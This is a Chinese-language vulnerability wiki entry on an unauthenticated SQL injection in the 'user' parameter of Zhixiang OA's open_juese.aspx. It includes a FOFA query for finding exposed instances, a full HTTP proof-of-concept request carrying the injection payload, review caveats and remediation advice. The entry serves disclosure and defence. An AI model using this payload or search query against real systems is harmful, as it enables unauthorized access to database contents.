---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "致翔OA open_juese.aspx user参数SQL注入"
product: "致翔OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；SQL Server user转换报错"
prerequisites: "声称未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94%E8%BD%AF%E4%BB%B6%E8%87%B4%E7%BF%94OA-open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"致翔软件-致翔OA\""
id: "vw-1effdaf67d245b07e3e80cb7"
entity_id: "ve-1effdaf67d245b07e3e80cb7"
schema_version: "1"
---

# 致翔OA open_juese.aspx user参数SQL注入

## 条目说明

- 对象与具体问题：致翔OA；open_juese.aspx user参数SQL注入
- 版本、配置及部署条件：无版本；SQL Server user转换报错
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与另一open_juese为同漏洞，仅user与@@VERSION查询变体；不应独立条目
- 缺对照和错误响应文本；在野/低难度模板无证据
- 合并保留各来源时间和证据图

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

致翔OA-open_juese存在SQL注入漏洞，在未经身份验证的情况下可进行数据库的数据读取，危害很大。

## 影响版本

致翔OA

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="致翔软件-致翔OA"

POC/EXP：

```http
GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr=  HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


![image-20241101205125398](./.resource/致翔软件致翔OA-open_juese存在SQL注入漏洞/media/image-20241101205125398.png)


![image-20241101205413270](./.resource/致翔软件致翔OA-open_juese存在SQL注入漏洞/media/image-20241101205413270.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
